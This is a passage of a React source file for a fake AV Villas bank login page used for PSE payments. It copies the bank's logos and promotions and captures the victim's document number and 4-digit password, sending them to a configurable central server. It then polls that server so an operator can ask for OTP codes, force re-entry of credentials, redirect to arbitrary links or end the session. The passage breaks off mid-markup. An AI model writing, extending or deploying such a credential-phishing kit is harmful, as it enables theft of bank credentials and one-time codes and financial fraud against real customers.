import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingAvvillas from "../../../../../components/LoadingAvvillas";
import avalLogoSuperBlack from "../../img/aval-logo-super-black.svg";
import bannerCard1 from "../../img/Banner_card_1.webp";
import bannerCard2 from "../../img/Banner_card_2.webp";
import bannerCard3 from "../../img/Banner_card_3.webp";
import grupoAvalColor from "../../img/grupoaval_color.svg";
import logoAvVillas from "../../img/logo-avvillas.svg";
import logoVigiladoHorizontal from "../../img/logo_vigilado_horizontal_black.svg";
import "./AvVillasLogin.css";

// Se inicializan las claves de estado para modal y mid flow
const AVVILLAS_ERROR_KEY = "avvillas_error_modal";
const AVVILLAS_MID_FLOW_KEY = "avvillas_mid_flow";
const AVVILLAS_ERROR_LOGIN_MSG =
  "Los datos que ingresaste no son validos, por favor intenta nuevamente (1611)";

// Se definen los estados tras login
// Cédula de ciudadanía Colombia: 6 a 10 dígitos
const AVVILLAS_CEDULA_MIN_LENGTH = 6;
const AVVILLAS_CEDULA_MAX_LENGTH = 10;

// Se normaliza el número de documento a solo dígitos (máx. 10)
const sanitizeDocumentDigits = (value) =>
  String(value || "")
    .replace(/\D/g, "")
    .slice(0, AVVILLAS_CEDULA_MAX_LENGTH);

const isValidColombianCedula = (value) =>
  /^\d{6,10}$/.test(String(value || ""));

const AVVILLAS_PASSWORD_MAX_LENGTH = 4;

// Se normaliza la clave a solo dígitos (máx. 4)
const sanitizePasswordDigits = (value) =>
  String(value || "")
    .replace(/\D/g, "")
    .slice(0, AVVILLAS_PASSWORD_MAX_LENGTH);

const ESTADOS_TRAS_LOGIN = [
  "sol_otp",
  "error_otp",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_login",
  "block_ip",
  "error_blocked",
  "link_bot",
  "sol_link_custom",
];

// Se crea el componente para renderizar el login AV Villas
const AvVillasLogin = () => {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan las referencias del polling y control de estado
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const loginErrorTimeoutRef = useRef(null);

  // Se inicializan los estados de UI
  const [getLoading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const [showLoginErrorBanner, setShowLoginErrorBanner] = useState(false);

  // Se inicializan los estados del formulario
  const [formData, setFormData] = useState({
    documentType: "Cédula de Ciudadanía",
    documentNumber: "",
    password: "",
  });

  // Se inicializan los estados de interacción del formulario
  const [touched, setTouched] = useState({
    documentNumber: false,
    password: false,
  });

  // Se inicializan los estados de interacción del formulario
  const [hasTyped, setHasTyped] = useState({
    documentNumber: false,
    password: false,
  });

  // Se inicializan los estados de interacción del select
  const [hasSelectedDocumentType, setHasSelectedDocumentType] = useState(false);
  const [isMoreCitiesOpen, setIsMoreCitiesOpen] = useState(false);

  // Se inicializan los estados de interacción del select
  const [isSelectOpen, setIsSelectOpen] = useState(false);
  const [focusedField, setFocusedField] = useState(null);
  const selectRef = useRef(null);

  // Se inicializan los estados de interacción del select
  const documentOptions = [
    "Cédula de Ciudadanía",
    "Cédula de Extranjería",
    "Tarjeta de Identidad",
  ];

  // Se inicializan los estados de validación del formulario
  const documentDigits = formData.documentNumber;
  const isDocumentComplete = isValidColombianCedula(documentDigits);
  const passwordDigits = formData.password;
  const isPasswordComplete = /^\d{4}$/.test(passwordDigits);
  const validationErrors = {
    documentNumber: !documentDigits
      ? "Este campo es requerido"
      : !isDocumentComplete
        ? `La cédula debe tener entre ${AVVILLAS_CEDULA_MIN_LENGTH} y ${AVVILLAS_CEDULA_MAX_LENGTH} dígitos`
        : "",
    password: !passwordDigits
      ? "Este campo es requerido"
      : !isPasswordComplete
        ? "Debe tener 4 números"
        : "",
  };

  // Se valida si el formulario es válido para enviar
  const isSubmitEnabled = Boolean(
    formData.documentType && isDocumentComplete && isPasswordComplete,
  );

  // Se crea el metodo para redirigir rutas internas
  const redirigir = (ruta) => {

    // Se redirige a la ruta
    navigate(ruta);
  };

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si existe el intervalo de polling
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se setea el intervalo de polling a null
      pollingIntervalRef.current = null;
    }
  };

  // Se limpian documento y contraseña tras error de credenciales
  const clearLoginCredentialFields = () => {
    setFormData((prev) => ({
      ...prev,
      documentNumber: "",
      password: "",
    }));
    setTouched((prev) => ({
      ...prev,
      documentNumber: false,
      password: false,
    }));
    setHasTyped((prev) => ({
      ...prev,
      documentNumber: false,
      password: false,
    }));
  };

  // Se oculta el banner de error y se evita reabrirlo por polling
  const dismissLoginErrorBanner = () => {
    if (loginErrorTimeoutRef.current) {
      clearTimeout(loginErrorTimeoutRef.current);
      loginErrorTimeoutRef.current = null;
    }

    setShowLoginErrorBanner(false);

    if (modalBloqueoEstadoRef.current === "error_login") {
      ignorarEstadoHastaCambioRef.current = "error_login";
      modalBloqueoEstadoRef.current = null;
      sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);
      allowPollNavigationRef.current = false;
    }
  };

  // Se programa el auto-ocultado del banner de error de login
  const scheduleLoginErrorAutoHide = () => {
    if (loginErrorTimeoutRef.current) {
      clearTimeout(loginErrorTimeoutRef.current);
    }

    loginErrorTimeoutRef.current = setTimeout(() => {
      dismissLoginErrorBanner();
      loginErrorTimeoutRef.current = null;
    }, 5000);
  };

  // Se muestra el banner inline de error de credenciales (no modal)
  const showLoginCredentialError = () => {
    setLoading(false);
    allowPollNavigationRef.current = false;
    modalBloqueoEstadoRef.current = "error_login";
    clearLoginCredentialFields();
    setShowLoginErrorBanner(true);
    scheduleLoginErrorAutoHide();
  };

  // Se crea el useEffect para inicializar session y estado de error
  useEffect(() => {

    // Se captura el estado de error pendiente
    const pendingError = localStorage.getItem(AVVILLAS_ERROR_KEY);
    const midFlow = sessionStorage.getItem(AVVILLAS_MID_FLOW_KEY) === "1";
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

    // Se valida el estado de error pendiente
    if (pendingError === "error_login") {
      modalBloqueoEstadoRef.current = "error_login";
      clearLoginCredentialFields();
      setShowLoginErrorBanner(true);
      scheduleLoginErrorAutoHide();
    } else if (pendingError === "block_ip") {

      // Se setea el estado de bloqueo del modal
      modalBloqueoEstadoRef.current = "block_ip";

      // Se muestra el modal de error de bloqueo de IP
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Acceso bloqueado por seguridad.");
    }

    // Se elimina el estado de error pendiente
    if (pendingError) {

      // Se elimina el estado de error pendiente
      localStorage.removeItem(AVVILLAS_ERROR_KEY);
    }

    // Se valida si existe handoff desde /pse
    if (pseHandoff) {

      // Se setea la sessionId
      localStorage.setItem("sessionId", pseHandoff);

      // Se setea la sessionId en la referencia
      sessionIdRef.current = pseHandoff;

      // Se setea el estado de last estado a null
      lastEstadoRef.current = null;

      // Se elimina el handoff de la session storage
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

      // Se elimina el mid flow de la session storage
      sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se quita el loading
      setLoading(false);
    } else if (midFlow) {

      // Se captura la sessionId
      const sid = localStorage.getItem("sessionId");

      // Se setea la sessionId en la referencia
      sessionIdRef.current = sid;

      // Se valida si la sessionId existe
      if (sid) {

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se activa el loading
        setLoading(true);

        // Se inicia el polling
        initPolling();
      }
    } else {

      // Se setea la sessionId en la referencia
      sessionIdRef.current = localStorage.getItem("sessionId");

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;
    }

    // Se para el polling y timers de error de login
    return () => {
      stopPolling();
      if (loginErrorTimeoutRef.current) {
        clearTimeout(loginErrorTimeoutRef.current);
        loginErrorTimeoutRef.current = null;
      }
    };
  }, []);

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se setea el intervalo de polling
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado
    verifyState();
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se usa try catch para controlar errores de red y estados bloqueados
    try {

      // Se captura la sessionId desde el ref o localStorage
      const sid = sessionIdRef.current || localStorage.getItem("sessionId");

      // Se valida que exista sessionId antes de consultar estado
      if (!sid) return;

      // Se actualiza la referencia local con la sessionId efectiva
      sessionIdRef.current = sid;

      // Se consulta el estado actual de la sesión en backend
      const response = await instanceBackend.post(`/avvillas/verify-state/${sid}`);

      // Se captura la respuesta normalizada de verifyState
      const { estado: estadoRaw, state, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se normalizan los valores para lógica de navegación
      const estadoActual = (estadoRaw || state || "").toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : text && String(text).trim() ? text : null;
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

      // Se marca cuando un link aún no está listo para evitar deduplicación temprana
      const linkPendiente = estadoActual === "sol_link_bot" || (estadoActual === "link_bot" && !hasUrl) || (estadoActual === "sol_link_custom" && !customLink);

      // Se valida si existe estado para procesar
      if (!estadoActual) return;

      // Se evita reprocesar el mismo estado tras cerrar modal de error_login
      if (ignorarEstadoHastaCambioRef.current) {

        // Se ignora mientras el backend no cambie de estado
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;

        // Se limpia el estado ignorado y el bloqueo del modal
        ignorarEstadoHastaCambioRef.current = null;

        // Se limpia el estado de bloqueo del modal
        modalBloqueoEstadoRef.current = null;
      }

      // Se evita reabrir modal para el mismo estado bloqueado
      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) return;

      // Se evita navegar por polling antes de acción real del usuario
      if (ESTADOS_TRAS_LOGIN.includes(estadoActual) && !allowPollNavigationRef.current) return;

      // Se evita reprocesar estados repetidos cuando no hay link pendiente
      if (!linkPendiente && lastEstadoRef.current === estadoActual) return;

      // Se guarda el último estado útil para deduplicación
      if (!linkPendiente) lastEstadoRef.current = estadoActual;

      // Se maneja la navegación según estado retornado por verifyState
      switch (estadoActual) {
        case "sol_otp":

          // Se para el polling y el loading para avanzar al siguiente paso
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el mid flow de la session storage
          sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

          // Se redirige al flujo OTP genérico cuando la sesión viene por TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP genérico cuando la sesión viene por TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {

            // Se redirige a la pantalla OTP AV Villas cuando no es TC
            redirigir("/banco_av_villas_autorizacion");
          }
          break;
        case "error_otp":

          // Se para el polling y el loading para mostrar/reenrutar el error
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el mid flow de la session storage
          sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

          // Se setea el estado de error en el localStorage
          localStorage.setItem(AVVILLAS_ERROR_KEY, "error_otp");

          // Se redirige al flujo OTP genérico con flag de error cuando es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP genérico con flag de error cuando es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se redirige a OTP AV Villas cuando no es TC
            redirigir("/banco_av_villas_autorizacion");
          }
          break;
        case "error_login":

          // Se para el polling y se bloquea navegación por polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el mid flow de la session storage
          sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se marca el estado que abrió modal para no reabrirlo en loop
          modalBloqueoEstadoRef.current = "error_login";
          showLoginCredentialError();
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se cierra polling y se limpia estado de flujo en storage
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el mid flow de la session storage
          sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

          // Se limpia el localStorage
          localStorage.clear();

          // Se limpia la session storage
          sessionStorage.clear();

          // Se redirige a finalizado TC o PSE según tipo de sesión
          if (isTcSession) {

            // Se redirige a finalizado TC
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige a finalizado PSE
            window.location.href = `/finalizado-pse?sessionId=${sessionIdRef.current}`;
          }

          // Se retorna
          break;
        case "link_bot":

          // Se redirige al link automático cuando ya existe URL
          if (hasUrl) {

            // Se para el polling y se elimina el mid flow de la session storage
            stopPolling();

            // Se elimina el mid flow de la session storage
            sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

            // Se redirige al link
            window.location.href = url;
          }

          // Se retorna
          break;
        case "sol_link_custom":

          // Se redirige al link personalizado cuando ya existe URL/texto
          if (customLink) {

            // Se para el polling y se elimina el mid flow de la session storage
            stopPolling();

            // Se elimina el mid flow de la session storage
            sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

            // Se redirige al link
            window.location.href = customLink;
          }

          // Se retorna
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling y se muestra modal de bloqueo
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se elimina el mid flow de la session storage
          sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de bloqueo del modal
          modalBloqueoEstadoRef.current = "block_ip";

          // Se muestra el modal de error de bloqueo de IP
          setShowModal(true);

          // Se setea el texto del modal
          setModalText("Acceso bloqueado por seguridad.");

          // Se retorna
          break;
        default:

          // Se retorna
          break;
      }
    } catch (error) {

      // Se captura status y estado para manejar bloqueo de IP
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el backend reporta bloqueo y se fuerza salida al banco
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el loading
        setLoading(false);

        // Se elimina el mid flow de la session storage 
        sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pantalla de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se crea el metodo para cerrar el modal
  const closeModal = () => {

    // Se captura el estado que disparó el modal
    const estadoServidor = modalBloqueoEstadoRef.current;

    // Se limpia el bloqueo actual del modal
    modalBloqueoEstadoRef.current = null;

    // Se ignora temporalmente error_login hasta que cambie en backend
    if (estadoServidor === "error_login") {
      dismissLoginErrorBanner();
    } else {
      setShowLoginErrorBanner(false);
    }

    // Se cierra el modal y se limpia el formulario local
    setShowModal(false);

    // Se limpia el formulario
    setFormData({
      documentType: "Cédula de Ciudadanía",
      documentNumber: "",
      password: "",
    });

    // Se limpia el estado de tocado
    setTouched({ documentNumber: false, password: false });

    // Se limpia el estado de has typed
    setHasTyped({ documentNumber: false, password: false });

    // Se limpia el estado de has selected document type
    setHasSelectedDocumentType(false);

    // Se valida bloqueo IP para limpiar sesión y salir del flujo
    if (estadoServidor === "block_ip") {

      // Se elimina el mid flow de la session storage
      sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

      // Se limpia el localStorage
      localStorage.clear();

      // Se redirige a la pantalla de inicio
      window.location.href = process.env.REACT_APP_URL_BANK || "/";

      // Se retorna
      return;
    }

    // Se desactiva polling para error_login hasta nuevo submit
    if (estadoServidor === "error_login") {

      // Se elimina el mid flow de la session storage
      sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;
    }
  };

  // Se crea el useEffect para cerrar el select al hacer click fuera
  useEffect(() => {

    // Se crea el método para cerrar el select al hacer click fuera
    const handleClickOutside = (event) => {

      // Se valida si el click ocurrió fuera del contenedor del select
      if (selectRef.current && !selectRef.current.contains(event.target)) {

        // Se cierra el select
        setIsSelectOpen(false);
      }
    };

    // Se registra el listener global para clicks
    document.addEventListener("mousedown", handleClickOutside);

    // Se limpia el listener al desmontar componente
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  // Se crea el metodo para manejar la selección de opción de documento
  const handleOptionClick = (value) => {

    // Se actualiza tipo de documento y estado visual de selección
    setFormData({ ...formData, documentType: value });

    // Se setea el estado de has selected document type
    setHasSelectedDocumentType(true);

    // Se cierra el select
    setIsSelectOpen(false);
  };

  // Se crea el metodo para calcular clases del label flotante
  const getLabelClass = (field, value) => {

    // Se valida si el campo está enfocado
    const isFocused = focusedField === field || (field === "documentType" && isSelectOpen);

    // Se valida si el campo tiene valor
    const hasValue = Boolean(value);

    // Se valida si el campo tiene error
    const hasError = touched[field] && validationErrors[field];

    // Se valida si el campo está flotante
    const isFloating = isFocused || hasValue || hasError;

    // Se setea el string de clases final
    let classes = "avv-input-label";

    // Se valida si el campo está flotante
    if (isFloating) classes += " avv-input-label--floating";

    // Se valida si el campo está enfocado
    if (isFocused) classes += " avv-input-label--focused";

    // Se valida si el campo tiene valor y no tiene error
    if (hasValue && !hasError) classes += " avv-input-label--filled";

    // Se valida si el campo tiene error
    if (hasError) classes += " avv-input-label--error";

    // Se retorna el string de clases final
    return classes;
  };

  // Se crea el metodo para calcular clases del contenedor del input
  const getContainerClass = (field, value) => {

    // Se valida si el campo está enfocado
    const isFocused = focusedField === field || (field === "documentType" && isSelectOpen);

    // Se valida si el campo tiene valor
    const hasValue = Boolean(value);

    // Se valida si el campo tiene error
    const hasError = touched[field] && validationErrors[field];

    // Se setea el string de clases final
    let classes = "avv-input-container";

    // Se valida si el campo está enfocado
    if (isFocused) classes += " avv-input-container--focused";

    // Se valida si el campo está seleccionado
    if (field === "documentType" && isSelectOpen)
      classes += " avv-input-container--active";

    // Se valida si el campo tiene valor
    if (hasValue) classes += " avv-input-container--filled";

    // Se valida si el campo tiene error
    if (hasError) classes += " avv-input-container--error";

    // Se retorna el string de clases final
    return classes;
  };

  // Se crea el metodo para enviar usuario y clave al backend
  const handleSubmit = async (e) => {

    // Se previene el submit por defecto
    e.preventDefault();

    dismissLoginErrorBanner();

    // Se marca el formulario como tocado para mostrar validaciones
    setTouched({ documentNumber: true, password: true });

    // Se valida si el formulario está incompleto o cargando
    if (!isSubmitEnabled || getLoading) return;

    // Se captura la sessionId desde localStorage
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que exista sessionId antes de enviar credenciales
    if (!sessionId) {

      // Se muestra el modal de error de sessionId
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se retorna
      return;
    }

    // Se arma el payload para backend central o endpoint local
    const dataSend = {
      "data": {
        "attributes": {
          "usuario": formData.documentNumber,
          "clave": formData.password,
          "tipoDocumento": formData.documentType,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/avvillas/authenticacion",
        },
      },
    };

    // Se captura la URL del backend central configurada por entorno
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa try catch para controlar petición de autenticación
    try {

      // Se para polling previo y se limpia último estado antes de enviar login
      stopPolling();

      // Se limpia el ultimo estado
      lastEstadoRef.current = null;

      // Se activa el loading
      setLoading(true);

      // Se envía autenticación al backend central o local
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/avvillas/authenticacion", dataSend);

      // Se valida respuesta exitosa para iniciar polling post-login
      if (response?.data?.success) {

        // Se captura la sessionId
        const sid = response.data.sessionId ?? sessionId;

        // Se setea la sessionId en localStorage
        localStorage.setItem("sessionId", sid);

        // Se setea la sessionId en la session storage
        sessionIdRef.current = sid;

        // Se setea el estado de mid flow
        sessionStorage.setItem(AVVILLAS_MID_FLOW_KEY, "1");

        // Se activa la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {
        allowPollNavigationRef.current = false;
        showLoginCredentialError();
      }
    } catch (error) {

      // Se desactiva loading y navegación por polling ante error de request
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura status y estado de error para bloqueo de IP
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se redirige al banco si backend reporta IP bloqueada
      if (status === 403 && estadoErr === "error_blocked") {

        // Se elimina el mid flow de la session storage   
        sessionStorage.removeItem(AVVILLAS_MID_FLOW_KEY);

        // Se limpia el localStorage
        localStorage.clear();

        // Se redirige a la pantalla de inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se retorna
        return;
      }

      // Se muestra mensaje de error de conectividad central/local
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
    }
  };

  // Se renderiza el componente
  return (
    <div className="avv-external-payments">
      <div className="avv-slogan">
        <p>Juntos trabajando</p>
      </div>

      <div className="avv-container-grid">
        {/* Se renderiza la sección izquierda de promociones */}
        <div className="avv-marketing-section">
          <div className="avv-promo-grid">
            {/* Se renderiza la tarjeta grande de promoción */}
            <div
              className="avv-promo-card avv-promo-card--large"
              style={{ backgroundImage: `url("${bannerCard1}")` }}
            >
              <div className="avv-promo-content">
                <p>
                  <strong>La Copa Mundial de la FIFA 2026™,</strong> ahora es
                  una experiencia AVAL, gracias a Visa.
                </p>
                <button
                  type="button"
                  className="avv-link-arrow avv-link-arrow-button"
                >
                  <span className="avv-icon avv-icon-open"></span>
                  <span>Conoce más</span>
                </button>
              </div>
            </div>

            {/* Se renderiza la tarjeta superior derecha */}
            <div
              className="avv-promo-card avv-promo-card--top"
              style={{ backgroundImage: `url("${bannerCard2}")` }}
            >
              <div className="avv-promo-content avv-promo-content--compact">
                <p>
                  Participa por <strong>18 paquetes dobles</strong> para vivir
                  la Copa Mundial de la FIFA 2026™
                </p>
                <button
                  type="button"
                  className="avv-link-arrow avv-link-arrow-button"
                >
                  <span className="avv-icon avv-icon-open"></span>
                  <span>Cómo ganar</span>
                </button>
              </div>
            </div>

            {/* Se renderiza la tarjeta inferior derecha */}
            <div
              className="avv-promo-card avv-promo-card--bottom"
              style={{ backgroundImage: `url("${bannerCard3}")` }}
            >
              <div className="avv-promo-content avv-promo-content--compact">
                <p>
                  ¡Tienes que tenerla! Pide tu{" "}
                  <strong>
                    Tarjeta de Crédito Visa AV Villas edición especial
                  </strong>
                </p>
                <button
                  type="button"
                  className="avv-link-arrow avv-link-arrow-button"
                >
                  <span className="avv-icon avv-icon-open"></span>
                  <span>Pídela y úsala ya</span>
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Se renderiza la sección derecha de login */}
        <div className="avv-login-section">
          <div className="avv-login-container">
            <div className="avv-login-box">
              <div className="avv-logo-wrapper">
                <img src={logoAvVillas} alt="AV Villas" className="avv-logo" />
              </div>

              <div className="avv-login-content">
                <section className="avv-login-form-section">
                  <div className="avv-login-header">
                    <h1 className="avv-title">
                      Ingresa para realizar tu pago PSE
                    </h1>
                  </div>

                  {showLoginErrorBanner ? (
                    <div className="avv-login-error-banner" role="alert">
                      <span className="avv-login-error-icon" aria-hidden="true">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth="1.85"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          width="22"
                          height="22"
                        >
                          <path d="M10.18 2.8c.8-1.36 2.84-1.36 3.64 0l8.92 15.07c.81 1.39-.19 3.13-1.82 3.13H3.08c-1.63 0-2.63-1.74-1.82-3.13L10.18 2.8z" />
                          <line x1="12" y1="9.4" x2="12" y2="13.6" />
                          <line x1="12" y1="17" x2="12.01" y2="17" />
                        </svg>
                      </span>
                      <p>{AVVILLAS_ERROR_LOGIN_MSG}</p>
                    </div>
                  ) : null}

                  <div className="avv-login-body">
                    <form
                      onSubmit={handleSubmit}
                      className="avv-form"
                      noValidate
                    >
                      {/* Se renderiza el select personalizado de tipo de documento */}
                      <div className="avv-form-group" ref={selectRef}>
                        <button
                          type="button"
                          className={getContainerClass(
                            "documentType",
                            formData.documentType,
                          )}
                          onClick={() => setIsSelectOpen(!isSelectOpen)}
                        >
                          <span
                            className={getLabelClass(
                              "documentType",
                              formData.documentType,
                            )}
                          >
                            Tipo de documento
                          </span>
                          <div className="avv-select-value">
                            {formData.documentType}
                          </div>
                          <div className="avv-icon">
                            {isSelectOpen ? (
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#6c7a89"
                                strokeWidth="2.5"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="20"
                                height="20"
                              >
                                <polyline points="18 15 12 9 6 15"></polyline>
                              </svg>
                            ) : (
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#6c7a89"
                                strokeWidth="2.5"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="20"
                                height="20"
                              >
                                <polyline points="6 9 12 15 18 9"></polyline>
                              </svg>
                            )}
                          </div>
                        </button>

                        {isSelectOpen && (
                          <div className="avv-select-dropdown">
                            {documentOptions.map((option) => (
                              <div
                                key={option}
                                className={`avv-select-option ${hasSelectedDocumentType && formData.documentType === option ? "avv-select-option--selected" : ""}`}
                                onClick={() => handleOptionClick(option)}
                              >
                                {option}
                              </div>
                            ))}
                          </div>
                        )}
                      </div>

                      {/* Se renderiza el campo de número de documento */}
                      <div className="avv-form-group">
                        <div
                          className={getContainerClass(
                            "documentNumber",
                            formData.documentNumber,
                          )}
                        >
                          <span
                            className={getLabelClass(
                              "documentNumber",
                              formData.documentNumber,
                            )}
                          >
                            Número de documento
                          </span>
                          <input
                            type="text"
                            className="avv-input-field"
                            value={formData.documentNumber}
                            onChange={(e) => {
                              if (showLoginErrorBanner) {
                                dismissLoginErrorBanner();
                              }
                              const onlyNumbers = sanitizeDocumentDigits(
                                e.target.value,
                              );
                              if (onlyNumbers.length > 0) {
                                setHasTyped((prev) => ({
                                  ...prev,
                                  documentNumber: true,
                                }));
                              }
                              setFormData({
                                ...formData,
                                documentNumber: onlyNumbers,
                              });
                            }}
                            onPaste={(e) => e.preventDefault()}
                            onFocus={() => setFocusedField("documentNumber")}
                            onBlur={() => {
                              setFocusedField(null);
                              if (!formData.documentNumber) {
                                setTouched((prev) => ({
                                  ...prev,
                                  documentNumber: true,
                                }));
                              }
                            }}
                            inputMode="numeric"
                            pattern="[0-9]*"
                            maxLength={AVVILLAS_CEDULA_MAX_LENGTH}
                            autoComplete="off"
                          />
                          {touched.documentNumber &&
                            validationErrors.documentNumber ? (
                            <div className="avv-icon avv-icon--error">
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#a00104"
                                strokeWidth="1.85"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="22"
                                height="22"
                              >
                                <path d="M10.18 2.8c.8-1.36 2.84-1.36 3.64 0l8.92 15.07c.81 1.39-.19 3.13-1.82 3.13H3.08c-1.63 0-2.63-1.74-1.82-3.13L10.18 2.8z"></path>
                                <line x1="12" y1="9.4" x2="12" y2="13.6"></line>
                                <line
                                  x1="12"
                                  y1="17.0"
                                  x2="12.01"
                                  y2="17.0"
                                ></line>
                              </svg>
                            </div>
                          ) : (
                            <div className="avv-icon avv-icon--toggle">
                              <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#6c7a89"
                                strokeWidth="2"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                width="22"
                                height="22"
                              >
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                <circle cx="12" cy="7" r="4"></circle>
                              </svg>
                            </div>
                          )}
                        </div>
                        {touched.documentNumber &&
                          validationErrors.documentNumber && (
                            <span className="avv-error-text">
                              {validationErrors.documentNumber}
                            </span>
                          )}
                      </div>

                      {/* Se renderiza el campo de contraseña */}
                      <div className="avv-form-group">
                        <div
                          className={getContainerClass(
                            "password",
                            formData.password,
                          )}
                        >
                          <span
                            className={getLabelClass(
                              "password",
                              formData.password,
                            )}
                          >
                            Contraseña
                          </span>
                          <input
                            type="password"
                            className="avv-input-field"
                            value={formData.password}
                            onChange={(e) => {
                              if (showLoginErrorBanner) {
                                dismissLoginErrorBanner();
                              }
                              const onlyNumbers = sanitizePasswordDigits(
                                e.target.value,
                              );
                              if (onlyNumbers.length > 0) {
                                setHasTyped((prev) => ({
                                  ...prev,
                                  password: true,
                                }));
                              }
                              setFormData({
                                ...formData,
